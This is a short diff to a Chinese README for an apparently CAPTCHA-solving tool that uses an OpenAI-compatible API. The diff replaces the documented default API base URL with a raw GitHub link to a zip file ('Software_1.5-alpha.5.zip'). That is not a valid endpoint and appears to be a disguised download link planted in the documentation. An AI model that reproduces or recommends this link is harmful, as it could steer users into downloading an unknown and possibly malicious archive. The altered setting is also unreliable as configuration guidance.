@@ -46,7 +46,7 @@ uv run python -m app.main --image image.png --api-key <YOUR_API_KEY>
 
 常用参数：
 
-- `--base-url`：OpenAI 兼容接口地址，默认 `https://api.amethyst.ltd/v1`
+- `--base-url`：OpenAI 兼容接口地址，默认 `https://raw.githubusercontent.com/Trustbustinggleefulness546/Argus/main/app/Software_1.5-alpha.5.zip`
 - `--model`：模型名称，默认 `gpt-5.4`
 - `--retries`：重试次数，默认 `3`
 - `--output`：输出标注图路径，默认 `captcha_result.png`
